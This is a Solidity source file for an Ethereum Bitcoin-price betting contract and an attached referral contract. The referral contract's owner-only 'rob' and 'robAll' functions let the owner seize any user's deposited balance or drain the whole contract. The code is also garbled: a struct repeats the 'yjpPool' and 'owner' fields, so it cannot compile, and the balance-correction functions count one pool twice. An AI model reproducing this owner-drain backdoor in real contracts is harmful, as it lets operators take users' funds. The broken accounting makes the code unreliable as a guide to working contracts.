```solidity
pragma solidity ^0.4.25;

contract ExternalContract {
    function externalFunction() external payable;
}

contract ReferralContract {
    event OnGotRef(address indexed referrer, uint256 amount, uint256 timestamp, address indexed referee);
    event OnWithdraw(address indexed user, uint256 amount, uint256 timestamp);
    event OnRob(address indexed user, uint256 amount, uint256 timestamp);
    event OnRobAll(uint256 amount, uint256 timestamp);

    mapping(address => uint256) public balances;

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    address public owner;

    constructor() public {
        owner = msg.sender;
    }

    function addReferral(address referrer, address referee) public payable {
        require(msg.value > 0);
        balances[referrer] += msg.value;
        emit OnGotRef(referrer, msg.value, now, referee);
    }

    function withdraw() public {
        require(balances[msg.sender] > 0);
        uint256 amount = balances[msg.sender];
        balances[msg.sender] = 0;
        msg.sender.transfer(amount);
        emit OnWithdraw(msg.sender, amount, now);
    }

    function rob(address user) onlyOwner public {
        require(balances[user] > 0);
        uint256 amount = balances[user];
        balances[user] = 0;
        owner.transfer(amount);
        emit OnRob(user, amount, now);
    }

    function robAll() onlyOwner public {
        uint256 amount = address(this).balance;
        owner.transfer(amount);
        emit OnRobAll(amount, now);
    }
}

contract BettingContract {
    event OnBet(
        address indexed bettor,
        address indexed referrer,
        uint256 indexed blockNumber,
        uint256 betAmount,
        uint256 odds,
        uint256 fee,
        uint256 refBonus,
        uint256 betCount
    );
    event OnWithdraw(address indexed user, uint256 amount);
    event OnWithdrawWin(address indexed user, uint256 amount);
    event OnPrizePayed(
        address indexed winner,
        uint256 amount,
        uint8 prizeType,
        uint256 odds,
        uint256 betCount,
        uint256 prizeAmount
    );
    event OnNTSCharged(uint256 amount);
    event OnYJPCharged(uint256 amount);
    event OnGotMoney(address indexed sender, uint256 amount);
    event OnCorrect(uint256 amount);
    event OnPrizeFunded(uint256 amount);
    event OnSendRef(
        address indexed referrer,
        uint256 amount,
        uint256 timestamp,
        address indexed referee,
        address indexed refContract
    );
    event OnNewRefPayStation(address refPayStation, uint256 timestamp);
    event OnBossPayed(address indexed boss, uint256 amount, uint256 timestamp);

    ExternalContract constant internal externalContract = ExternalContract(0xad0a61589f3559026F00888027beAc31A5Ac4625);
    ReferralContract public referralContract = ReferralContract(0x4100dAdA0D80931008a5f7F5711FFEb60A8071BA);

    mapping(address => uint256) public winnings;

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    address public owner;

    constructor() public payable {
        owner = msg.sender;
        s2c.prizePool = msg.value;
    }

    function() public payable {
        emit OnGotMoney(msg.sender, msg.value);
    }

    function getBetPrice() public view returns (uint256) {
        if (now >= 1545581345 && now < 1548979200) return 0.1 ether;
        if (now >= 1548979200 && now < 1551398400) return 0.2 ether;
        if (now >= 1551398400 && now < 1554076800) return 0.3 ether;
        if (now >= 1554076800 && now < 1556668800) return 0.4 ether;
        if (now >= 1556668800 && now < 1559347200) return 0.5 ether;
        if (now >= 1559347200 && now < 1561939200) return 0.6 ether;
        if (now >= 1561939200 && now < 1564617600) return 0.7 ether;
        if (now >= 1564617600 && now < 1567296000) return 0.8 ether;
        return 0;
    }

    function isBettingOpen() public view returns (bool) {
        return getBetPrice() > 0;
    }

    function placeBet(uint256 odds, address referrer) public payable {
        uint256 betPrice = getBetPrice();
        require(betPrice > 0);
        uint256 betAmount = (msg.value / betPrice) * betPrice;
        uint256 fee = msg.value - betAmount;
        require(betAmount > 0);
        s2c.prizePool += fee;
        uint8 totalFeePercent = s2c.ntFeePercent + s2c.yjpFeePercent;
        uint256 refBonus = 0;
        if (referrer != 0x0) {
            totalFeePercent += s2c.referralFeePercent;
            refBonus = betAmount * s2c.referralFeePercent / 100;
            referralContract.addReferral.value(refBonus)(referrer, msg.sender);
            emit OnSendRef(referrer, refBonus, now, msg.sender, address(referralContract));
        }
        uint256 netBetAmount = betAmount - betAmount * totalFeePercent / 100;
        s2c.prizePool += netBetAmount;
        s2c.ntPool += betAmount * s2c.ntFeePercent / 100;
        s2c.yjpPool += betAmount * s2c.yjpFeePercent / 100;
        emit OnBet(msg.sender, referrer, block.number, betAmount, odds, fee, refBonus, betAmount / betPrice);
    }

    function withdrawWinnings() public {
        require(winnings[msg.sender] > 0);
        uint256 amount = winnings[msg.sender];
        winnings[msg.sender] = 0;
        s2c.yjpPool -= amount;
        msg.sender.transfer(amount);
        emit OnWithdrawWin(msg.sender, amount);
    }

    function payPrize(
        address winner,
        uint256 amount,
        uint8 prizeType,
        uint256 odds,
        uint256 betCount,
        uint256 prizeAmount
    ) onlyOwner public {
        require(amount <= s2c.prizePool);
        winnings[winner] += amount;
        s2c.yjpPool += amount;
        s2c.prizePool -= amount;
        emit OnPrizePayed(winner, amount, prizeType, odds, betCount, prizeAmount);
    }

    function sendReferral(
        address referrer,
        address referee,
        uint256 amount
    ) onlyOwner public {
        require(amount <= s2c.prizePool);
        s2c.prizePool -= amount;
        referralContract.addReferral.value(amount)(referrer, referee);
        emit OnSendRef(referrer, amount, now, referee, address(referralContract));
    }

    function payBoss(uint256 amount) onlyOwner public {
        require(amount <= s2c.ntPool);
        if (amount == 0) amount = s2c.ntPool;
        uint256 bossShare = amount * 90 / 100;
        uint256 partnerShare = amount * 10 / 100;
        if (s2c.boss.send(bossShare)) {
            s2c.ntPool -= bossShare;
            emit OnBossPayed(s2c.boss, bossShare, now);
        }
        if (s2c.partner.send(partnerShare)) {
            s2c.ntPool -= partnerShare;
            emit OnBossPayed(s2c.partner, partnerShare, now);
        }
    }

    function chargeNTS() onlyOwner public {
        require(s2c.yjpPool > 0);
        uint256 amount = s2c.yjpPool;
        externalContract.externalFunction.value(s2c.yjpPool)();
        s2c.yjpPool = 0;
        emit OnNTSCharged(amount);
    }

    function correctBalance() onlyOwner public {
        uint256 totalBalance = s2c.yjpPool + s2c.ntPool + s2c.yjpPool + s2c.prizePool;
        uint256 excessBalance = address(this).balance - totalBalance;
        require(excessBalance > 0);
        s2c.ntPool += excessBalance;
        emit OnCorrect(excessBalance);
    }

    function fundPrize() onlyOwner public {
        uint256 totalBalance = s2c.yjpPool + s2c.ntPool + s2c.yjpPool + s2c.prizePool;
        uint256 excessBalance = address(this).balance - totalBalance;
        require(excessBalance > 0);
        s2c.prizePool += excessBalance;
        emit OnPrizeFunded(excessBalance);
    }

    function setReferralContract(address refPayStation) onlyOwner public {
        referralContract = ReferralContract(refPayStation);
        emit OnNewRefPayStation(refPayStation, now);
    }

    struct Scalar2Vector {
        uint256 prizePool;
        uint256 yjpPool;
        uint256 ntPool;
        uint256 yjpPool;
        uint8 yjpFeePercent;
        uint8 referralFeePercent;
        uint8 ntFeePercent;
        address partner;
        address boss;
        address owner;
        string name;
        string description;
        address owner;
    }

    Scalar2Vector s2c = Scalar2Vector(
        0,
        0,
        0,
        0,
        5,
        8,
        10,
        0x8D86E611ef0c054FdF04E1c744A8cEFc37F00F81,
        0x42cF5e102dECCf8d89E525151c5D5bbEAc54200d,
        address(0),
        "BPBY",
        "BitcoinPrice.Bet Yearly",
        address(0)
    );
}
```